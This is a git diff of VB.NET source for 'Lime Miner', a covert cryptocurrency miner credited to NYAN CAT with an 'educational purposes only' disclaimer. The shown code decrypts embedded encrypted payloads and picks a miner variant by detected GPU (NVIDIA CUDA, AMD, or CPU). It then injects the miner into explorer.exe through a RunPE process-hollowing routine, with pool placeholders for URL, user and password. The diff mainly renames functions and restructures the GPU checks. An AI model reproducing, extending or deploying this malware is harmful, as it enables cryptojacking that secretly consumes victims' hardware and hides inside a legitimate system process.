@@ -1,5 +1,13 @@
 ﻿
 
+'       │ Author     : NYAN CAT
+'       │ Name       : Lime Miner
+
+'       Contact Me    https : //github.com/NYAN-x-CAT
+
+'       This program Is distributed for educational purposes only.
+
+
 Imports System.Security.Cryptography
 Imports Microsoft.Win32
 Imports System.Management
@@ -42,7 +50,7 @@ Public Class Program
                         Install()
 #End If
         KillLastProc()
-        RunIt()
+        Initialize()
     End Sub
 
 #If INS Then
@@ -77,8 +85,8 @@ Public Class Program
         Return AES_Decryptor(MyResource.GetObject(Get_))
     End Function
 
-    Public Shared Sub GetTheLoad(ByVal PL As Byte(), ByVal arg As String, ByVal buffer As Byte())
-	'RunPE https://github.com/gigajew/WinXRunPE-x86_x64
+    Public Shared Sub Run(ByVal PL As Byte(), ByVal arg As String, ByVal buffer As Byte())
+        'RunPE https://github.com/gigajew/WinXRunPE-x86_x64
         Try
             Assembly.Load(PL).GetType("Project1.Program").GetMethod("Load", BindingFlags.Public Or BindingFlags.Static).Invoke(Nothing, New Object() {buffer, "C:\Windows\explorer.exe", arg})
         Catch ex As Exception
@@ -99,28 +107,29 @@ Public Class Program
         Next
     End Sub
 
-    Public Shared Sub RunIt()
+    Public Shared Sub Initialize()
         Try
             Dim Args As String = ""
             Dim xmr As Byte() = Nothing
 
-            If GetTheSpec.ToLower.Contains("nvidia") Then
+            If GetGPU.ToLower.Contains("nvidia") Then
+
                 If IO.Directory.Exists("C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\") Then
+                    Args = "--cuda-bfactor=12 --cuda-bsleep=100"
                     For Each folder As String In IO.Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\NVIDIA GPU Computing Toolkit\CUDA")
                         If folder.Contains("v8") Then
-                            Args = "--cuda-bfactor=12 --cuda-bsleep=100"
                             xmr = GetTheResource("#nvidia")
                         ElseIf folder.Contains("v9") Then
-                            Args = "--cuda-bfactor=12 --cuda-bsleep=100"
                             xmr = GetTheResource("#nvidia2")
-                        Else
-                            Args = "-t " + CType((Environment.ProcessorCount / 2), String) + " --max-cpu-usage=50"
-                            xmr = GetTheResource("#cpu")
                         End If
                     Next
+                Else
+                    'if for some reason there is no CUDA...
+                    Args = "-t " + CType((Environment.ProcessorCount / 2), String) + " --max-cpu-usage=50"
+                    xmr = GetTheResource("#cpu")
                 End If
 
-            ElseIf GetTheSpec.ToLower.Contains("amd") Then
+            ElseIf GetGPU.ToLower.Contains("amd") Then
                 Args = "--opencl-platform=0 --opencl-devices=0 --opencl-launch=1600x8,1600x8,1600x8"
                 xmr = GetTheResource("#amd")
             Else
@@ -129,12 +138,12 @@ Public Class Program
             End If
 
 
-            GetTheLoad(GetTheResource("#dll"), "-B --donate-level=1 -a cryptonight --url=#URL -u #USER -p #PWD -R --variant=-1 " + Args, xmr)
+            Run(GetTheResource("#dll"), "-B --donate-level=1 -a cryptonight --url=#URL -u #USER -p #PWD -R --variant=-1 " + Args, xmr)
         Catch ex As Exception
         End Try
     End Sub
 
-    Public Shared Function GetTheSpec() As String
+    Public Shared Function GetGPU() As String
         Try
             Dim VideoCard As String = ""
             Dim objquery As New System.Management.ObjectQuery("SELECT * FROM Win32_VideoController")
@@ -155,7 +164,6 @@ Public Class Program
             If VideoCard.ToLower.Contains("nvidia") OrElse VideoCard.ToLower.Contains("amd") Then
                 Return VideoCard
             End If
-
             Return ""
         Catch ex As Exception
             Return ""
